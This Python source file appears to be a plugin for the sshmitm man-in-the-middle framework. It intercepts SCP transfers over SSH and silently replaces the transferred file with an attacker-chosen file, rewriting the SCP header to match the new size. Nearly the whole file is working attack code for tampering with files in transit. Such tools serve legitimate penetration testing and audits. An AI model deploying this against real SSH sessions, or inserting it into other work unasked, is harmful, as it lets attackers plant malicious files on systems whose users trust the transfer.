"""SCPReplaceFile: Replace file with another file during SCP transfer.

This module is a subclass of SCPForwarder from the sshmitm library and implements
the handle_command and process_data methods to replace the original file with a
specified file during SCP transfer.

Attributes:
data_sent (bool): Flag to keep track of if the replacement file data has already been sent.
file_stat (os.stat_result): Stat result of the replacement file.
file_to_send (file): The replacement file that is to be sent during SCP transfer.
args (argparse.Namespace): Namespace object containing the command-line arguments passed to the script.
bytes_remaining (int): Bytes remaining to be sent.
file_size (int): The size of the replacement file.
file_command (str): The command of the file being transferred (e.g. 'C' for copying to the remote machine).
file_mode (str): The mode of the file being transferred (e.g. '0644').
file_name (str): The name of the file being transferred.
got_c_command (bool): Flag to keep track of if the 'C' command has been received.

Methods:
parser_arguments(): Adds a required argument --scp-replace to the argument parser.
init(session: sshmitm.session.Session): Initializes the SCPReplaceFile instance.
handle_command(traffic: bytes) -> bytes: Handles the incoming SCP command and returns the modified SCP command.
process_data(traffic: bytes) -> bytes: Processes the SCP data and returns the modified SCP data
(i.e.the replacement file).
"""

import os
import sshmitm
from sshmitm.forwarders.scp import SCPForwarder


class SCPReplaceFile(SCPForwarder):
    """replace the file with another file
    """

    @classmethod
    def parser_arguments(cls) -> None:
        plugin_group = cls.parser().add_argument_group(cls.__name__)
        plugin_group.add_argument(
            '--scp-replace',
            dest='scp_replacement_file',
            required=True,
            help='file that is used for replacement'
        )

    def __init__(self, session: 'sshmitm.session.Session') -> None:
        super().__init__(session)
        self.args.scp_replacement_file = os.path.expanduser(self.args.scp_replacement_file)

        self.data_sent = False
        self.file_stat = os.stat(self.args.scp_replacement_file)
        self.file_to_send = open(self.args.scp_replacement_file, 'rb')  # pylint: disable=consider-using-with

    def handle_command(self, traffic: bytes) -> bytes:
        traffic = super().handle_command(traffic)
        if not self.got_c_command:
            return traffic

        self.bytes_remaining = self.file_size = self.file_stat.st_size
        traffic_string = f"{self.file_command}{self.file_mode} {self.file_size} {self.file_name}\n"
        return traffic_string.encode("UTF-8")

    def process_data(self, traffic: bytes) -> bytes:
        if not self.data_sent:
            self.data_sent = True
            data = self.file_to_send.read()
            data += b"\x00"
            return data
        self.file_to_send.close()
        return b"\x00"
